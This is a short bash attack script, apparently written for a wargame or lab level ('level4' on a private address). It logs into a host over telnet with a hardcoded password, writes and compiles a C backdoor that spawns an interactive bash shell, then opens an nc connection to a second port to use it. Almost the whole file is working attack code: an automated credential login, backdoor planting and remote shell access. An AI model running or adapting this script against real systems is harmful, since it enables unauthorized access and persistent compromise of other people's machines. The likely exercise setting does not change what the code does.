#!/bin/bash
# Description:
# 

export TERM=xterm
export LANG=en_US.UTF8
export IP1=192.168.10.240
export PORT1=23
export PORT2=79
export USER1=level4
export PASS1="suck my brain"
export CMD1="echo '#include<stdlib.h>' > /home/level4/tmp/backdoor.c "
export CMD2="echo 'main() {system(\"/bin/bash -i\");};' >> /home/level4/tmp/backdoor.c"
export CMD3="gcc -o /home/level4/tmp/backdoor /home/level4/tmp/backdoor.c"

attack() {
    sleep 2; echo "$PASS1"
    sleep 1; echo "hostname"
    sleep 1; echo "$CMD1"
    sleep 1; echo "$CMD2"
    sleep 1; echo "$CMD3"
    sleep 1; echo "exit"
}

echo "[*] trying : telnet"
attack | telnet -l $USER1 $IP1 $PORT1 > /dev/null 2>&1
echo "[+] telnet connection established."

echo "[*] trying : nc"
if [ -f /bin/nc -o -x /bin/nc ] ; then
    echo "[+] nc connection established."
    echo "[*] Some error messages can be ignored."
    echo "[*] Have a good time."
    echo "[*] =============================================="
    nc $IP1 $PORT2
else
    echo "[-] nc command not found"
    exit 1
fi
